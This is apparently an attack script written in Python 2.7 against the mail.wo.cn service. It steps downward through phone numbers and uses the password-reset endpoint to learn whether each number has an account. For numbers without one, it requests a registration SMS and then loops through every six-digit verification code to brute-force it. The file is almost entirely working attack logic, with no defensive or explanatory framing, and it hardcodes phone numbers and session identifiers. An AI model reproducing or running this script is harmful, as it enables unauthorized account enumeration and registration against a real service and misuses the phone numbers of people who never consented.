#!/usr/bin/env python2.7
# coding: utf-8

import requests
import json

phone = 13269682237

url = 'http://mail.wo.cn/resetPassword.action'
def checkuser(phonenumber):
    data = {
        'actionType':'CheckUser',
        'domain':'wo.cn',
        'user':'',
        }
    data['user'] = '{}'.format(phonenumber)
    s = requests.Session()
    res = s.post(url=url, data=data, timeout=1)
    resultcode = json.loads(res.text)['resultCode']
    return resultcode
class resetpassword():
    def __init__(self):
        self.url = 'http://mail.wo.cn/resetPassword.action'
    def sendsmsverifycode(phonenumber):
        data = {
            'actionType':'sendSmsVerifyCode',
            'user':'13269682230',
            'domain':'wo.cn',
            'localVerifyCode':'',
            'mbid':'',
            'ran':'',
            }
        data['user'] = '{}'.format(phonenumber)
        res = requests.post(url=self.url, data=data)
        resultcode = int(json.loads(res.text)['resultCode'])
        return resultcode
    def checksmsverifycode(phonenumber, verifycode):
        data = {
        'actionType':'checkSmsVerifyCode',
        'verifyCode':'000000',
        'user':'13269682230',
        'domain':'wo.cn',
        'mbid':'143822692826913269682230wo.cn0.954453885967018',
        }
        data['user'] = '{}'.format(phonenumber)
        data['verifyCode'] = '{}'.format(verifycode)
        res = requests.post(url=self.url, data=data)
        resultcode = json.loads(res.text)['resultCode']
        return resultcode  # 'wrong' or ?

class register():
    def __init__(self, phonenumber):
        self.url = 'http://mail.wo.cn/mail/register.action'
        self.phonenumber = phonenumber
    def sendsmsverifycode(self):
        data = {
            'actionType':'sendSmsVerifyCode',
            'user':'13269682236',
            'domain':'wo.cn',
            'mbid':'143822795683813269682236wo.cn0.8781670596116832',
            'ran':'11DC45E9-A2D7-4A35-B329-4109C6757F8D',
        }
        data['user'] = '{}'.format(self.phonenumber)
        while True:
            try:
                res = requests.post(url=self.url, data=data, timeout=1)
            except:
                continue
            else:
                break
        resultcode = json.loads(res.text)['resultCode']
        return resultcode  # '0' or '100'?
    def checksmsverifycode(self, verifycode):
        data = {
            'actionType':'checkSmsVerifyCode',
            'verifyCode':'000000',
            'user':'13269682235',
            'domain':'wo.cn',
            'mbid':'143822821433713269682235wo.cn0.5272929444789491',
        }
        data['user'] = self.phonenumber
        data['verifycode'] = '%06d' %(verifycode)
        while True:
            try:
                res = requests.post(url=self.url, data=data, timeout=1)
            except:
                continue
            else:
                break
        resultcode = json.loads(res.text)['resultCode']
        return resultcode  # 'wrong' or ?
    def bruteverifycode(self):
        verifycode = 0
        while verifycode<999999:
            if self.checksmsverifycode(verifycode) == 'wrong':
                print self.phonenumber, '%06d' %(verifycode), 'wrong'
                verifycode = verifycode + 1
                continue
            else:
                break
        return verifycode

while True:
    try:
        resultcode = checkuser(phonenumber=phone)
        if resultcode == '0':  # exist
            print phone, 'exist'
        elif resultcode == 'PasswordResetAction_user_not_exit':  # not exist
            r = register(phonenumber=phone)
            smsret = r.sendsmsverifycode()
            if smsret =='0':
                print r.bruteverifycode()
            else:
                print phone, smsret
                phone = phone - 1
                continue
        else:
            print phone, resultcode
        phone = phone - 1
    except requests.exceptions.Timeout:
        print phone, 'timeout'
        continue
    except Exception, e:
        print phone, e
        continue
